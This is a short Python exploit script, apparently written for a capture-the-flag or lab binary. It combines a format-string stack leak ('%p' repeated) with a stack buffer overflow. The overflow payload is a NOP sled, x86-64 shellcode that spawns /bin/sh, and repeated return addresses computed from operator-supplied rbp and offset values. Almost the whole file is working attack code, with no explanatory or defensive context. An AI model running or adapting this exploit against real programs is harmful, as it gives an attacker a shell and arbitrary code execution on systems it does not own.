#!/usr/bin/python

from __future__ import print_function

import binascii
import os
import struct
import sys
import time

if sys.version_info.major == 2:
  def input_():
   return raw_input()
else:
  def input_():
    return input()

def info(x):
  print(x, file = sys.stderr); sys.stderr.flush()

def ask(prompt):
  print(prompt, file = sys.stderr, end = ''); sys.stderr.flush()
  return input_()

def out(x):
  print(x); sys.stdout.flush(); time.sleep(0.1)

nop       = "\x90"
shellcode = "\x48\x31\xd2" \
            "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" \
            "\x48\xc1\xeb\x08" \
            "\x53" \
            "\x48\x89\xe7" \
            "\x52" \
            "\x57" \
            "\x48\x89\xe6" \
            "\xb0\x3b" \
            "\x0f\x05"

bufsize = int(ask("bufsize? "))

format_string_exploit = '%p' * (bufsize/2)

info("*** FORMAT STRING EXPLOIT ***")
out(format_string_exploit)

rbp             = int(ask("rbp? "), 16)
offset          = int(ask("offset? "))

addr            = rbp - bufsize
zeroes          = 0 # (16 - len(hex(addr)[2:])) / 2

addr_part       = addr
buffer_exploits = []

addrs           = (bufsize + offset - len(shellcode))/2/8
nops            = bufsize + offset - addrs*8 - len(shellcode)

filled_addr = lambda x, n: \
  struct.pack('<Q', x)[:8 - zeroes] + "\xff" * (zeroes - n) + "\x00" * n

if zeroes:
  addr_parts = [filled_addr(addr, 0)] * addrs
  for i in xrange(0, addrs):
    for j in xrange(0, zeroes):
      addr_parts[addrs - i - 1] = filled_addr(addr, j+1)
      buffer_exploits += [nop * nops + shellcode + "".join(addr_parts)]
else:
  addr_part = struct.pack("<Q", addr)
  buffer_exploits += [nop * nops + shellcode + addr_part * addrs]

for x in buffer_exploits:
  info("*** exploit {} ***".format(binascii.hexlify(x)))

info("*** BUFFER EXPLOITS ***")
for exploit in buffer_exploits:
  out(exploit)

info("*** addr = {} ***".format(hex(addr)))

# info("*** FORMAT STRING EXPLOIT ***")
# out(format_string_exploit)
